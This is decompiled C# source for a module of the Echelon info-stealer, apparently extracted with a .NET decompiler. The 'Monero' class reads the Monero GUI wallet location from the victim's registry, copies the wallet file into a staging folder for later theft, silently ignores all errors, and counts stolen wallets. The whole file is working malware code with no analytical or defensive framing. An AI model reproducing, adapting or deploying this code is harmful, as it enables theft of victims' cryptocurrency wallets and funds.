using System;
using System.IO;
using Microsoft.Win32;

namespace Echelon.Stealer.Wallets
{
	// Token: 0x02000012 RID: 18
	internal class Monero
	{
		// Token: 0x06000047 RID: 71 RVA: 0x00019D8C File Offset: 0x00017F8C
		public static void XMRcoinStr(string directorypath)
		{
			try
			{
				using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("monero-project").OpenSubKey("monero-core"))
				{
					try
					{
						Directory.CreateDirectory(directorypath + Monero.base64xmr);
						string text = registryKey.GetValue("wallet_path").ToString().Replace("/", "\\");
						Directory.CreateDirectory(directorypath + Monero.base64xmr);
						File.Copy(text, directorypath + Monero.base64xmr + text.Split(new char[]
						{
							'\\'
						})[text.Split(new char[]
						{
							'\\'
						}).Length - 1]);
						Monero.count++;
						Wallets.count++;
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x04000048 RID: 72
		public static int count;

		// Token: 0x04000049 RID: 73
		public static string base64xmr = "\\Wallets\\Monero\\";
	}
}
